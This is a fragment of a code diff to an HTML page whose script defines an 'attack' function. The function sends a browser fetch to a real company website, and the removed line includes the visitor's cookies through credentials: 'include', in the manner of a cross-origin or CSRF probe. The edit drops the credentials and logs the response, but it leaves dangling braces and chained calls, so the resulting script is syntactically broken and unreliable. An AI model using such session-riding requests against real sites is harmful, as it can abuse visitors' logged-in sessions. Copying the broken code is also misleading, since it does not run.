@@ -11,8 +11,12 @@
 
   <script>
     function attack() {
-    fetch("https://www.rockwellautomation.com", { credentials: "include" })
-        method: "GET",
+fetch("https://www.rockwellautomation.com", {
+  method: "GET"
+})
+.then(r => r.text())
+.then(d => console.log(d))
+.catch(e => console.error(e));
       })
       .then(res => res.text())
       .then(data => {
